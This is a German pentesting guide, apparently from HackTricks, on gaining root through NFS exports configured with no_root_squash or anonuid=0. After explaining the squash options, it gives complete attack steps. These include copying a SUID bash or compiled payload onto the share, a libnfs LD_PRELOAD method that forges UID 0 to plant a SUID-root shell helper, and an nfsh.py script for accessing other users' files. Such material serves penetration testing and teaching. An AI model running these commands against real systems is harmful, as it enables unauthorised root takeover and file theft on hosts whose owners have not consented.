# Rechteausweitung durch NFS-Fehlkonfiguration ohne Root-Squash

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen zum Squashing

Bei NFS AUTH_SYS/AUTH_UNIX basiert der Server die Prüfungen von Dateiberechtigungen auf der `uid` und `gid`, die in jeder RPC-Anfrage übermittelt werden. Andere Sicherheitsvarianten wie Kerberos verwenden andere Anmeldedaten, und der Server kann numerische Anmeldedaten vor der Berechtigungsprüfung zuordnen.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Ordnet jede UID und GID dem anonymen Konto zu, das unter Linux standardmäßig `nobody` (65534) ist. `no_all_squash` ist die Standardeinstellung für Anfragen, die nicht von root stammen.<sup>[[4]](#references)</sup>
- **`root_squash`**: Dies ist die Standardeinstellung unter Linux und ordnet Anfragen mit UID/GID 0 (root) dem anonymen Konto zu; andere UIDs und GIDs werden nicht gesquasht.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Deaktiviert das Root-Squashing, sodass Anfragen mit UID/GID 0 auf dem Server als root behandelt werden können.<sup>[[4]](#references)</sup>

Wenn ein erlaubter Client ein beschreibbares Export-Verzeichnis aus **`/etc/exports`** einbinden kann, das mit **`no_root_squash`** konfiguriert ist, können seine Anfragen mit UID/GID 0 dort als root-Benutzer des Servers schreiben.<sup>[[4]](#references)</sup>

`root_squash` ordnet nur UID/GID 0 neu zu; bei AUTH_SYS kann eine **nichtnull numerische UID/GID** eines erlaubten Clients weiterhin einem anderen Konto auf dem Server entsprechen. Ein beschreibbares Export-Verzeichnis kann daher auch bei aktiviertem Root-Squashing zu einem Pfad zwischen Benutzern werden, wenn der Client eine Datei mit dieser numerischen Identität erstellen kann und der Server den Zugriff erlaubt. Für eine SUID/SGID-Übergabe solltest du außerdem den resultierenden Dateieigentümer, den Ausführungszugriff, den `nosuid`-Status des Server-Mounts, ACLs sowie SELinux oder andere Richtlinien prüfen. Der exportierte Pfad, die Option `rw` oder eine übereinstimmende Nummer allein beweisen nicht, dass der Client berechtigt ist, der Export aktiv ist oder beide Hosts dieselbe effektive Identitätszuordnung verwenden. Prüfe `/etc/exports` und lokale Metadaten passiv; binde während der Aufzählung keine neue Freigabe ein und erstelle keine Testdatei.<sup>[[4]](#references)[[5]](#references)</sup>

Weitere Informationen zu **NFS** findest du unter:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Rechteausweitung

### Anonyme Zuordnung mit Root-Rechten

Prüfe nicht nur auf `no_root_squash`. Bei `root_squash,anonuid=0,anongid=0` wird eine Anfrage des Clients mit UID/GID 0 gesquasht **und wieder root zugeordnet**. Bei `all_squash,anonuid=0,anongid=0` werden sogar nicht-root-Identitäten des Clients auf dem Server root zugeordnet. Bei einem beschreibbaren `sec=sys`-Export kann jede dieser Konfigurationen das root-eigene Datei-Primitiv ermöglichen, das für die unten beschriebene SUID-Übergabe verwendet wird; die Einschränkungen für erlaubte Clients und das Mount des Opfers gelten weiterhin.<sup>[[4]](#references)</sup>

Verwende auf dem Server `exportfs -v`, um den aktiven Export und die Optionen für den **passenden Client** zu prüfen, einschließlich `rw`, `sec=`, Squash-Modus und `anonuid`/`anongid`. Prüfe bei der Konfigurationsanalyse außerdem `/etc/exports.d/*.exports`; `/etc/exports` allein ist möglicherweise unvollständig.<sup>[[4]](#references)[[6]](#references)</sup>

```bash
# Example /etc/exports entries: squashed requests map to server UID 0
/srv/share 192.0.2.10(rw,sec=sys,root_squash,anonuid=0,anongid=0)
/srv/share 192.0.2.11(rw,sec=sys,all_squash,anonuid=0,anongid=0)
```

### Remote Exploit

Option 1 mit bash:
- Auf einem zugelassenen Client ein beschreibbares Export als root mounten, **`/bin/bash`** hineinkopieren, das **SUID**-Bit setzen und die Datei über einen Victim-Mount ausführen, der nicht mit `nosuid` eingebunden ist.<sup>[[2]](#references)[[4]](#references)</sup>
    - Damit die hochgeladene Datei weiterhin root gehört, muss der Server die Client-UID 0 mit **`no_root_squash`** beibehalten oder die Anfrage mit **`anonuid=0`** auf UID 0 abbilden. Andernfalls ist eine SUID-Binärdatei für ein anderes Konto nur möglich, wenn der Client sie mit der numerischen UID/GID dieses Kontos erstellen oder besitzen kann.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2 mit kompiliertem C-Code:
- Binde das Verzeichnis von einem zugelassenen Client aus ein, kopiere einen kompilierten Payload hinein, der SUID-Berechtigungen missbraucht, setze dessen **SUID**-Bit und führe ihn auf dem Opfer aus (siehe einige [C-SUID-Payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Dieselben Einschränkungen wie zuvor

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Lokaler Exploit

> [!TIP]
> Beachte: Wenn du **einen Tunnel von deinem Rechner zum Opferrechner aufbauen kannst, kannst du weiterhin die Remote-Version verwenden, um diese Privilege Escalation auszunutzen, indem du die erforderlichen Ports tunnelst**.\
> Der folgende Trick ist nützlich, wenn `/etc/exports` den Export auf die IP-Adresse des Opferrechners beschränkt: Der Remote-Client kann ihn nicht mounten, aber die lokale Methode kann über die Freigabe funktionieren, die bereits auf dem zugelassenen Host eingebunden ist.<sup>[[2]](#references)</sup>\
> Bei dieser unprivilegierten libnfs-Methode muss der Export in **`/etc/exports`** das Flag `insecure` verwenden, damit der Prozess einen nicht reservierten Quellport nutzen kann. `secure` ist die Standardeinstellung; ein Prozess, der einen reservierten Port binden kann, benötigt diese Option jedoch nicht.<sup>[[1]](#references)[[4]](#references)</sup>

### Grundlegende Informationen

Ein NFSv3-Client mit AUTH_UNIX übermittelt bei jedem Aufruf seine effektive UID, GID und Gruppen; der Server verwendet diese Werte für die Berechtigungsprüfungen. Diese lokale Methode missbraucht dieses Modell, indem sie die RPC-Anmeldedaten über [libnfs](https://github.com/sahlberg/libnfs) fälscht. Dessen Preload-Modul unterstützt das Überschreiben von UID/GID im NFS-Kontext.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Kompilieren der Bibliothek

Das libnfs-Beispiel muss möglicherweise an den Kernel des Ziels angepasst werden. In der hier verwendeten Anleitung wird ausdrücklich darauf hingewiesen, vor dem Kompilieren des Preload-Moduls die fallocate-Systemaufrufe auszukommentieren.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Durchführung des Exploits

Das Beispiel erstellt einen kleinen C-Helfer, der eine Shell startet, legt ihn dann auf dem Share ab und verwendet `ld_nfs.so` mit UID 0 im NFS-Kontext, um ihn zu SUID-root zu machen.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Exploit-Code kompilieren:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Lege den Exploit auf der Freigabe ab und ändere seine Berechtigungen, indem du die UID fälschst**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Führe den Exploit aus, um Root-Rechte zu erlangen**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus: NFShell für unauffälligen Dateizugriff

Sobald root-Zugriff erlangt wurde, setzt dieses `nfsh.py`-Muster die effektive UID vor dem Ausführen eines Befehls auf die UID der Zieldatei, sodass Zugriff möglich ist, ohne die Besitzverhältnisse rekursiv zu ändern.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Ausführen wie folgt:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```



## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Eine Geschichte über eine weniger bekannte NFS-privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS-Version-3-Protokollspezifikation](https://datatracker.ietf.org/doc/html/rfc1813)
- [6] [exportfs(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/exportfs.8.html)
{{#include ../../banners/hacktricks-training.md}}
